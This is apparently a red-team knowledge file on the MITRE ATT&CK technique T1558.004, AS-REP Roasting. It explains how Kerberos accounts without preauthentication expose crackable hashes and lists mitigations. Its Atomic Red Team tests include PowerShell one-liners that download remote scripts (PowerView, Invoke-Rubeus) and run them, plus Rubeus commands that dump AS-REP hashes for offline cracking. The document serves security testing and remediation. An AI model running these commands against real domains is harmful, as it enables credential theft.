---
name: "T1558.004_as-rep-roasting"
description: "Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by Password Cracking Kerberos messages."
category: "authentication"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1558.004
  - credential-access
  - windows
  - sub-technique
technique_id: "T1558.004"
tactic: "credential-access"
all_tactics:
  - credential-access
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1558/004"
tech_stack:
  - windows
cwe_ids:
  - CWE-522
chains_with:
  - T1558
  - T1558.001
  - T1558.002
  - T1558.003
  - T1558.005
prerequisites:
  - T1558
severity_boost:
  T1558: "Chain with T1558 for deeper attack path"
  T1558.001: "Chain with T1558.001 for deeper attack path"
  T1558.002: "Chain with T1558.002 for deeper attack path"
---

# T1558.004 AS-REP Roasting

> **Sub-technique of:** T1558

## High-Level Description

Adversaries may reveal credentials of accounts that have disabled Kerberos preauthentication by Password Cracking Kerberos messages. 

Preauthentication offers protection against offline Password Cracking. When enabled, a user requesting access to a resource initiates communication with the Domain Controller (DC) by sending an Authentication Server Request (AS-REQ) message with a timestamp that is encrypted with the hash of their password. If and only if the DC is able to successfully decrypt the timestamp with the hash of the user’s password, it will then send an Authentication Server Response (AS-REP) message that contains the Ticket Granting Ticket (TGT) to the user. Part of the AS-REP message is signed with the user’s password.

For each account found without preauthentication, an adversary may send an AS-REQ message without the encrypted timestamp and receive an AS-REP message with TGT data which may be encrypted with an insecure algorithm such as RC4. The recovered encrypted data may be vulnerable to offline Password Cracking attacks similarly to Kerberoasting and expose plaintext credentials. 

An account registered to a domain, with or without special privileges, can be abused to list all domain accounts that have preauthentication disabled by utilizing Windows tools like PowerShell with an LDAP filter. Alternatively, the adversary may send an AS-REQ message for each user. If the DC responds without errors, the account does not require preauthentication and the AS-REP message will already contain the encrypted data. 

Cracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.

## Kill Chain Phase

- Credential Access (TA0006)

**Platforms:** Windows

## What to Check

- [ ] Identify if AS-REP Roasting technique is applicable to target environment
- [ ] Check Windows systems for indicators of AS-REP Roasting
- [ ] Verify mitigations are bypassed or absent (3 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Rubeus asreproast

Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus

**Supported Platforms:** windows

```powershell
cmd.exe /c "#{local_folder}\#{local_executable}" asreproast /outfile:"#{local_folder}\#{out_file}"
```

**Dependencies:**
- Computer must be domain joined
- Rubeus must exist

### Atomic Test 2: Get-DomainUser with PowerView

Utilizing PowerView, run Get-DomainUser to identify domain users. Upon execution, progress and info about users within the domain being scanned will be displayed.

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
```

### Atomic Test 3: WinPwn - PowerSharpPack - Kerberoasting Using Rubeus

PowerSharpPack - Kerberoasting Using Rubeus technique via function of WinPwn

**Supported Platforms:** windows

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1')
Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap"
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to AS-REP Roasting by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1558.004 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1047 Audit
Kerberos preauthentication is enabled by default. Older protocols might not support preauthentication therefore it is possible to have this setting disabled. Make sure that all accounts have preauthentication whenever possible and audit changes to setting. Windows tools such as PowerShell may be used to easily find which accounts have preauthentication disabled.

### M1027 Password Policies
Ensure strong password length (ideally 25+ characters) and complexity for service accounts and that these passwords periodically expire. Also consider using Group Managed Service Accounts or another third party product such as password vaulting.

### M1041 Encrypt Sensitive Information
Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible.


## Detection

### Detect AS-REP Roasting Attempts (T1558.004)


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| AS-REP Roasting technique applicable | High | Credential Access |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-522 | Insufficiently Protected Credentials |


## References

- [Microsoft Detecting Kerberoasting Feb 2018](https://blogs.technet.microsoft.com/motiba/2018/02/23/detecting-kerberoasting-activity-using-azure-security-center/)
- [Harmj0y Roasting AS-REPs Jan 2017](https://blog.harmj0y.net/activedirectory/roasting-as-reps/)
- [Stealthbits Cracking AS-REP Roasting Jun 2019](https://blog.stealthbits.com/cracking-active-directory-passwords-with-as-rep-roasting/)
- [SANS Attacking Kerberos Nov 2014](https://redsiege.com/kerberoast-slides)
- [AdSecurity Cracking Kerberos Dec 2015](https://adsecurity.org/?p=2293)
- [Microsoft 4768 TGT 2017](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768)
- [Microsoft Kerberos Preauth 2014](https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx)
- [Atomic Red Team - T1558.004](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1558.004)
- [MITRE ATT&CK - T1558.004](https://attack.mitre.org/techniques/T1558/004)
